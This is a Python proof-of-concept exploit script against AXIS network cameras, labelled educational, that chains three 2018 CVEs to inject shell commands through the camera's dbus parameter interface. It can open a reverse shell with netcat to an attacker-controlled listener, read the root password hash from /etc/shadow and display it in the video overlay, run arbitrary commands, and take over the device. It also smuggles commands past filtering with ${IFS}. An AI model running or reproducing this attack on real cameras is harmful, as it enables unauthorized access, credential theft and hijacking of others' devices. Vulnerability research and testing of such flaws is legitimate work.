#!/usr/bin/env python3
"""
!!! FOR EDUCATIONAL PURPOSES ONLY !!!

PoC for exploit of AXIS Network Cameras

https://www.axis.com/files/sales/ACV-128401_Affected_Product_List.pdf

CVE-2018-10660      Shell Command Injection
CVE-2018-10661      Access Control Bypass
CVE-2018-10662      Exposed Insecure Interface

"""
import requests
import random
import string
import argparse
from time import sleep

stage: int = 1

def logging(message: str):
    if not args.quiet:
        print(message, end="")

parser = argparse.ArgumentParser()
# Basic arguments
parser.add_argument("-a",   "--auto", action="store_true", help="Auto mode (do not prompt for listener)")
parser.add_argument("-q",   "--quiet", action="store_true", help="Quiet mode (no prompt, no output)")
parser.add_argument("-x",   "--test", action="store_true", help="Test for vulnerability only")
parser.add_argument("-T",   "--target", type=str, required=True, help="Target device IP")
parser.add_argument("-TP",  "--target-port", type=int, help="Target device port", default="80")
parser.add_argument("-L",   "--listen", type=str, help="Listener IP (if not specified, response from http://checkip.amazonaws.com)")
parser.add_argument("-LP",  "--listen-port", type=int, help="Listener port", default=1337)

# Overlay arguments
parser.add_argument("-ot",  "--overlay-text", type=str, help="Specify image overlay text")
parser.add_argument("-ol",  "--overlay-leak", action="store_true", help="Read from file and display with image overlay text (default: root password hash)")
parser.add_argument("-olc", "--overlay-leak-command", type=str, help="Optional leak command (USE AT OWN RISK)")

# Non-overlay command arguments
parser.add_argument("-r",   "--reverse", action="store_true", help="Request reverse shell from target (nc [LISTEN] [LISTEN_PORT] -e /bin/sh)")
parser.add_argument("-e",   "--execute", type=str, help="Execute command (OVERRIDES --reverse)")
parser.add_argument("--takeover", action="store_true", help="Takeover device (OVERRIDES --reverse and --execute) *requires takeover.py")
parser.add_argument("-w", "--webserve", action="store_true", help="Serve content for --takeover locally on LISTEN_PORT")

# Special Connection arguments
parser.add_argument("-f",   "--target-path", type=str, help="Target file path", default="index.shtml")
parser.add_argument("-p",   "--proxy", type=str, help="Proxy to send requests in URL form 'http://IPADDRESS:PORT' (optional)")
parser.add_argument("-s",   "--ssl", action="store_true", help="HTTPS")

args = parser.parse_args()

# Set some default values
target_ip = args.target
target_proto = "http"
listen_ip = ""
listen_port = 1337
overlay_text = None
req_proxy = ""

"""
    Process arguments
"""
if (args.target_port != None):
    target_port = args.target_port

if (args.proxy != None):
    if (args.proxy.split(':')[0] == "https"): req_proxy = {'https':args.proxy,}
    else: req_proxy = {'http':args.proxy,}

if (args.listen != None):
    listen_ip = args.listen
else:
    try:
        listen_ip = requests.get("http://checkip.amazonaws.com", proxies=req_proxy).text.strip()
    except:
        logging("Could not determine listener local IP address, quitting.")
        exit(1)

if (args.listen_port != None):
    listen_port = args.listen_port

if (args.target_path != None):
    target_file = args.target_path

if (args.ssl):
    target_proto = "https"

if (args.overlay_text != None and args.overlay_leak):
    logging(f"Cannot use --overlay-text (Overlay text) and --overlay-leak (Leak) simutaneously.\n")
    exit(1)

if (args.overlay_text != None):
    overlay_text = args.overlay_text

if (args.overlay_leak):
    leak_cmd = "grep 'root' /etc/shadow | cut '-d:' -f2"

if (args.overlay_leak_command != None):
    leak_cmd = args.overlay_leak_command

if (args.takeover):
    import takeover
    exe_cmd = takeover.takeover_cmd(listen_ip, listen_port)
else:
    if (args.execute != None):
        exe_cmd = f"{args.execute}"
    else:
        if (args.reverse):
            exe_cmd = f"nc {listen_ip} {listen_port} -e /bin/sh"

    if (args.execute != None and args.reverse):
        logging(f"Reverse and Execute specified:\n\tOverriding --reverse command with --execute command.\n")


"""
    Output some configuration
"""
logging(f"Configuration\n-------------\nTarget: {target_proto}://{target_ip}:{target_port}/{target_file}\nListener: {listen_ip}:{listen_port}\nOverlay: {overlay_text}\n")

if (args.overlay_leak or args.overlay_leak_command != None):
    logging(f"Overlay Leak: {leak_cmd}\n")

logging(f"Proxy: {req_proxy}\n")

if (args.reverse or args.execute != None):
    logging(f"Command: {exe_cmd}\n")
logging(f"\n")

"""
    Quality of life
"""
# Character generator
def gen_chars(count: int) -> str:
    letters = ''.join(random.choice(string.ascii_lowercase) for i in range(count))
    return letters

# HTTP status checking
def http_check(req: requests, test: bool = False) -> int:
    match req.status_code:
        case 200:
            if not test:
                return 0

        case 204:
            logging(f"Empty response received. Success?\n")
            return 0
        
        case 303:
            if (test):
                if (req.text.find('Continue to') >= 0):
                    logging(f"Test connection SUCCESS\n")
                    return 0
                logging("Test connection FAIL")
            
            logging("Something went wrong")
            logging(req.status_code)
            logging(req.text)
        
        case 403:
            logging(f"Unable to connect.\nAUTH ERROR\n")
            logging(f"URL requested: {req.request}")
        
        case 404:
            logging(f"Specified target {req.request} not found.\n")
        
        case _:
            logging(f"Unexpected response from server.")
            logging(f"Received status code: {req.status_code}")
            logging(f"Response:\n{req.text}")
        
    logging("Quitting")
    return 1

target_url = f"{target_proto}://{target_ip}:{target_port}/{target_file}/{gen_chars(1)}.srv"

# Test for possible device exploitation
def test_connect():
    global stage
    
    TEST_DATA = {
        'action': gen_chars(5),
        'return_page': gen_chars(5),
    }
    
    logging(f"+ Testing connection to device...\t\t\t\t")
    if http_check(requests.post(f"{target_url}", data=TEST_DATA, proxies=req_proxy, allow_redirects=False, verify=False), True):
        exit(1)


"""
    Request, Sync and Sanity
"""
# Send request
def send_req(req_data: dict):
    if http_check(requests.post(f"{target_url}", data=req_data, proxies=req_proxy, allow_redirects=False, verify=False)):
        exit(1)


# Sync modifications
def sync_req():
    SYNC_DATA = {
        'action': "dbus",
        'args': f"--system --dest=com.axis.PolicyKitParhand --type=method_call /com/axis/PolicyKitParhand com.axis.PolicyKitParhand.SynchParameters",
    }
    
    logging(f"Syncing parameters...\t\t\t\t\t\t")
    send_req(SYNC_DATA)
    sleep(1)

# Reset root.Time.DST.Enabled to 'yes' for a baseline value
def dst_reset_req():
    global stage
    
    RESET_DATA = {
        'action': "dbus",
        'args': f"--system --dest=com.axis.PolicyKitParhand --type=method_call /com/axis/PolicyKitParhand com.axis.PolicyKitParhand.SetParameter string:root.Time.DST.Enabled string:yes",
    }
    
    logging(f"Stage {stage}: Resetting root.Time.DST.Enabled\t\t\t")
    send_req(RESET_DATA)
    sync_req()
    stage += 1   


"""
    Overlay functions
"""

# Enable Image.I0.Text.TextEnabled overlay
def overlay_enable():
    global stage
    
    OVERLAY_DATA = {
        'action': "dbus",
        'args': f"--system --dest=com.axis.PolicyKitParhand --type=method_call /com/axis/PolicyKitParhand com.axis.PolicyKitParhand.SetParameter string:Image.I0.Text.TextEnabled string:yes",
    }

    logging(f"Stage {stage}: Attempt to enable image overlay text...\t\t")
    send_req(OVERLAY_DATA)
    sync_req()
    

# Modify Image.I0.Text.String overlay
def overlay_req():
    global stage
    overlay_enable()

    OVERLAY_DATA = {
        'action': "dbus",
        'args': f"--system --dest=com.axis.PolicyKitParhand --type=method_call /com/axis/PolicyKitParhand com.axis.PolicyKitParhand.SetParameter string:Image.I0.Text.String string:{overlay_text}",
    }

    logging(f"Stage {stage}: Attempt to modify image overlay text...\t\t")
    send_req(OVERLAY_DATA)
    sync_req()
    stage += 1


# Modify Image.I0.Text.String to leak data
def overlay_leak():
    global stage
    overlay_enable()

    overlay_leak_cmd = f"gdbus call --system --dest com.axis.PolicyKitParhand --object-path /com/axis/PolicyKitParhand --method com.axis.PolicyKitParhand.SetParameter Image.I0.Text.String $({leak_cmd})"
    overlay_leak_cmd_ifs = overlay_leak_cmd.replace(' ', "${IFS}")

    OVERLAY_DATA = {
        'action': "dbus",
        'args': f"--system --dest=com.axis.PolicyKitParhand --type=method_call /com/axis/PolicyKitParhand com.axis.PolicyKitParhand.SetParameter string:root.Time.DST.Enabled string:;({overlay_leak_cmd_ifs})&",
    }

    logging(f"Stage {stage}: Modify and leak with image text overlay...\t")
    send_req(OVERLAY_DATA)
    sleep(1)
    sync_req()
    dst_reset_req()
    stage += 1

"""
    Command functions
"""

# Inject command into root.Time.DST.Enabled via dbus exploit    
def dst_command_req():
    global stage
    
    if (args.webserve):
        import threading
        http_srv_thread = threading.Thread(target=takeover.run_server, args=(listen_port,))
        logging("+ Starting content server (will run until QUIT is received from target)\n")
        http_srv_thread.start()

    cmd_ifs = exe_cmd.replace(' ', "${IFS}")
    
    COMMAND_DATA = {
        'action': "dbus",
        'args': f"--system --dest=com.axis.PolicyKitParhand --type=method_call /com/axis/PolicyKitParhand com.axis.PolicyKitParhand.SetParameter string:root.Time.DST.Enabled string:;({cmd_ifs})&",
    }
    
    logging(f"Stage {stage}: Injecting command to root.Time.DST.Enabled...\t\t")
    send_req(COMMAND_DATA)
    logging("+ Running sync to execute command\n")
    sync_req()
    dst_reset_req()

    if (args.webserve):
        while (takeover.srv_run):
            sleep(1)
        logging("+ QUIT received. Stopping content server\n")
        http_srv_thread.join()

    stage += 1


def main():

    test_connect()

    if (args.test):
        exit(0)

    if (overlay_text != None or args.overlay_leak or (args.reverse or args.execute != None)):
        logging("+ Preparing to execute exploit.\n")
      
    if (overlay_text != None):
        overlay_req()

    if (args.overlay_leak or args.overlay_leak_command):
        overlay_leak()

    if (args.takeover) or (args.reverse) or (args.execute != None):
        if (not args.quiet):
            if (not args.takeover) and (not args.auto):
                input("= Start listener if needed and press Enter to continue...")
        dst_command_req()
    

if __name__ == "__main__":
    main()    
